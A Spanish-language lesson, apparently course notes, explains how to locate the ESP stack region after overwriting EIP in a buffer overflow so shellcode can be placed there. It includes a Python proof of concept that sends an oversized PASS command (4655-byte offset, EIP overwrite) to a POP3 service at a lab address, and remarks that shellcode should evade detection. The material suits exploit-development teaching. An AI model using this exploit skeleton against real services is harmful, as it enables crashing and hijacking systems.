Una vez que se ha encontrado el **offset** y se ha sobrescrito el valor del registro **EIP** en un buffer overflow, el siguiente paso es identificar en qué parte de la memoria se están representando los caracteres introducidos en el campo de entrada.

Después de sobrescribir el valor del registro EIP, cualquier carácter adicional que introduzcamos en el campo de entrada, veremos desde Immunity Debugger que en este caso particular estos estarán representados al comienzo de la **pila** (**stack**) en el registro **ESP** (**Extended Stack Pointer**). El ESP (Extended Stack Pointer) es un registro de la CPU que se utiliza para manejar la pila (stack) en un programa. La pila es una zona de memoria temporal que se utiliza para almacenar valores y **direcciones de retorno** de las funciones a medida que se van llamando en el programa.

Una vez que se ha identificado la ubicación de los caracteres en la memoria, la idea principal en este punto es introducir un **shellcode** en esa ubicación, que son instrucciones de bajo nivel las cuales en este caso corresponderán a una instrucción maliciosa.

El shellcode se introduce en la pila y se coloca en la misma dirección de memoria donde se colocaron los caracteres sobrescritos. En otras palabras, se aprovecha el desbordamiento del búfer para ejecutar el shellcode malicioso y tomar control del sistema.

Es importante tener en cuenta que el shellcode debe ser diseñado cuidadosamente para evitar que se detecte como un programa malicioso, y debe ser compatible con la arquitectura de la CPU y el sistema operativo que se está atacando.

En resumen, la asignación de espacio para el shellcode implica identificar la ubicación en la memoria donde se colocaron los caracteres sobrescritos en el buffer overflow y colocar allí el shellcode malicioso. Sin embargo, no todos los caracteres del shellcode pueden ser interpretados. En la siguiente clase veremos cómo detectar estos **badchars** y cómo generar un shellcode que no disponga de estos caracteres.

```python
#!/usr/bin/python3
   2   │ 
   3   │ import socket
   4   │ import sys
   5   │ 
   6   │ #Variables globales
   7   │ 
   8   │ ip_address = "10.47.1.42"
   9   │ lport = 110
  10   │ offset = 4655
  11   │ 
  12   │ before_eip = b"A"*offset
  13   │ 
  14   │ eip = b"B"*4
  15   │ after_eip = b"C"*200 
  16   │ 
  17   │ 
  18   │ payload = before_eip + eip + after_eip
  19   │ 
  20   │ def exploit():
  21   │ 
  22   │     # Create a socket
  23   │     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  24   │ 
  25   │     # Connect to the server
  26   │ 
  27   │     s.connect((ip_address, lport))
  28   │     
  29   │     # Revice the banner
  30   │      
  31   │     banner = s.recv(1024)
  32   │ 
  33   │     s.send(b"USER lotus" + b'\r\n')
  34   │     response = s.recv(1024)
  35   │     s.send(b"PASS" + payload + b'\r\n')
  36   │     s.close()
  37   │ 
  38   │ if __name__ == "__main__":
  39   │     exploit()    
```
![[Screenshot (20) 1.png]]